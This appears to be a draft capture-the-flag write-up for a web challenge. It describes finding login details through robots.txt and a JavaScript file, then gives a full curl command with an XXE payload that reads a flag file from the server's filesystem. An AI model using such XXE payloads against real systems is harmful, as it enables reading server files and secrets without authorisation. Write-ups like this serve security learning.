---
date: '2025-08-25T13:40:51+05:30'
draft: true
title: 'Reviewbot 3000'
tags:
- web
- XXE
- python
---

XXE is one of those things you never expect to be present but it somehow makes it way to a web chall.

<!--more-->

## Recon

### Challenge description

This challenge's description tells that the bot responds to all forms of input - text, even JSON.

The website at `https://techpulse.gencyscorp.in/login` requires logging in with credentials.

## Solve

### Login

Enumerate `robots.txt` to find the password from `https://techpulse.gencyscorp.in/js/auth.js` and the username is `ctf-player`. The result is that the followign cookies are set.

```
X-token: 43334random
X-Challenge-Id: 1
```

### XXE

After further enumeration, the site has a page for giving feedback for products. It makes POST request with formdata body.

It also gives a successful redirect to a JSON body.

So, why not try good ol' XXE?!

```sh
$ curl -s -X POST 'https://techpulse.gencyscorp.in/api/success-review' \
  -H 'X-token: 43334random' \
  -H 'X-Challenge-Id: 1' \
  -H 'Content-Type: application/xml' \
  -d '<?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE request [ <!ENTITY xxe SYSTEM "file:///proc/self/cwd/flag.txt"> ]> <request> <comment>&xxe;</comment> <score>42</score> </request>' | jq .comment_received -r
```

This request gets the flag successfully.

## Flag

`USTCtf{REDACTED}`

Note: Flag has been redacted.
